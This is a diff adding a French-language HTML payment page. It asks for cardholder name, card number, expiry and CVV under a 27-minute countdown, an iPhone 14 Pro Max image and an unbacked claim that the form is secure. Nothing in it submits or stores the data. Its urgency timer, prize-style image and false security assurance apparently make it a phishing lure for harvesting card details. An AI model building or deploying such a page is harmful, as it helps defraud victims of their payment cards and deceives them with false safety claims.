@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire de paiement sécurisé</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f0f0f0;
+            padding: 20px;
+        }
+        .card-images {
+            margin-bottom: 20px;
+        }
+        .payment-button {
+            background-color: #3498db;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .payment-button:hover {
+            background-color: #2980b9;
+        }
+        .countdown {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .iphone-image {
+            margin-top: 20px;
+            max-width: 100px;
+        }
+        .security-message {
+            margin-top: 20px;
+            font-style: italic;
+            color: #555;
+        }
+        form {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        form label {
+            display: block;
+            text-align: left;
+            margin-bottom: 8px;
+            color: #333;
+        }
+        form select,
+        form input[type="text"],
+        form input[type="number"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            transition: border-color 0.3s;
+        }
+        form select:focus,
+        form input[type="text"]:focus,
+        form input[type="number"]:focus {
+            outline: none;
+            border-color: #3498db;
+        }
+        form .expiry-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+        }
+        form select {
+            width: calc(50% - 10px);
+        }
+        form button[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        form button[type="submit"]:hover {
+            background-color: #2980b9;
+        }
+        .required {
+            color: #e74c3c;
+        }
+    </style>
+</head>
+<body>
+    <div class="countdown" id="countdown">27:00</div>
+    <div class="card-images">
+        <img src="visa.png" alt="Visa Card" width="100">
+        <img src="mastercard.png" alt="MasterCard" width="100">
+        <!-- Ajoutez d'autres images de cartes ici -->
+    </div>
+    <form id="payment-form">
+        <label for="cardholder-name">Nom du titulaire de la carte <span class="required">*</span>:</label><br>
+        <input type="text" id="cardholder-name" name="cardholder-name" required placeholder="----"><br><br>
+        <label for="card-number">Numéro de carte <span class="required">*</span>:</label><br>
+        <input type="text" id="card-number" name="card-number" required placeholder="----"><br><br>
+        <label for="expiry">Date d'expiration <span class="required">*</span>:</label><br>
+        <div class="expiry-container">
+            <select id="expiry-month" name="expiry-month" required>
+                <option value="" disabled selected>Mois</option>
+                <option value="01">Janvier</option>
+                <option value="02">Février</option>
+                <option value="03">Mars</option>
+                <option value="04">Avril</option>
+                <option value="05">Mai</option>
+                <option value="06">Juin</option>
+                <option value="07">Juillet</option>
+                <option value="08">Août</option>
+                <option value="09">Septembre</option>
+                <option value="10">Octobre</option>
+                <option value="11">Novembre</option>
+                <option value="12">Décembre</option>
+            </select>
+            <select id="expiry-year" name="expiry-year" required>
+                <option value="" disabled selected>Année</option>
+                <option value="2023">2023</option>
+                <option value="2024">2024</option>
+                <option value="2025">2025</option>
+                <option value="2026">2026</option>
+                <option value="2027">2027</option>
+                <!-- Ajoutez d'autres années si nécessaire -->
+            </select>
+        </div><br><br>
+        <label for="cvv">CVV <span class="required">*</span>:</label><br>
+        <input type="text" id="cvv" name="cvv" required placeholder="----"><br><br>
+        <button type="submit" class="payment-button">Effectuer le paiement</button>
+    </form>
+    <div class="security-message">
+        <p>Ce formulaire est sécurisé.</p>
+    </div>
+    <div>
+        <img src="iphone14promax.png" alt="iPhone 14 Pro Max" class="iphone-image">
+    </div>
+
+    <script>
+        // Compte à rebours de 27 minutes (27:00)
+        var countdownElement = document.getElementById('countdown');
+        var countdown = 1620; // 27 minutes en secondes
+
+        function formatTime(seconds) {
+            var mins = Math.floor(seconds / 60);
+            var secs = seconds % 60;
+            return `${mins}:${secs < 10 ? '0' + secs : secs}`;
+        }
+
+        function updateCountdown() {
+            countdown--;
+            countdownElement.textContent = formatTime(countdown);
+
+            if (countdown <= 0) {
+                clearInterval(timer);
+                countdownElement.textContent = 'Temps écoulé';
+            }
+        }
+
+        var timer = setInterval(updateCountdown, 1000);
+    </script>
+</body>
+</html>
